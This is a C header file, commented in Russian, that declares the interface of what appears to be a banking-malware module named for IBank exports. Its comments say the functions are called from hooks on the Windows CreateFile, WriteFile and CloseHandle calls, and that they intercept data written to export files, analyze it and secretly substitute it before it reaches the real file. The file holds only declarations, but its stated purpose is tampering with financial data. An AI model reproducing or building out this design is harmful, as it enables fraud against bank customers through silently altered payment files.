#ifndef IBankExportH
#define IBankExportH

#include "Windows.h"

//инициализация данных для контроля экспорта, передается имя файла в котором содержатся настройки
bool SExpInit(const char* fileSettings);
//очистка
void SExpRelease();
//Вызывается в хуке функции CreateFile, при открытии файла с флагом GENERIC_WRITE, функция помещает хэндл файла
//в массив SExpFiles для дальнейшего просмотра записываемых данных
//возвращает true если хэндл файла успешно запомнен, иначе false - что означает нехватку выделенной памяти для 
//SExpFiles, в таком случае нужно увеличить значение константы MaxSExpFiles
bool SExpCreateFile( HANDLE file, LPCWSTR lpFileName );
//загружает данные в память для дальнейших операций, если возвращает true, то данные успешно приняты и во внешней функции 
//не нужно их отправлять в реальную функцию WriteFile, но при этом в переданных параметрах указать что данные выгружены,
//false - данные отвергнуты, следовательно во внешней функции нужно
//отправить эти данные в реальную функцию WriteFile
bool SExpWriteFile( HANDLE file, LPCVOID buf, DWORD sz );
//вызывается в хуке функции CloseHandle(), функция анализирует и подменяет данные, и конечный результат выгружает в реальный файл
//реальное закрытие файла должно быть во внешней функции (в хуке)
void SExpCloseHandle(HANDLE file);

#endif //IBankExportH
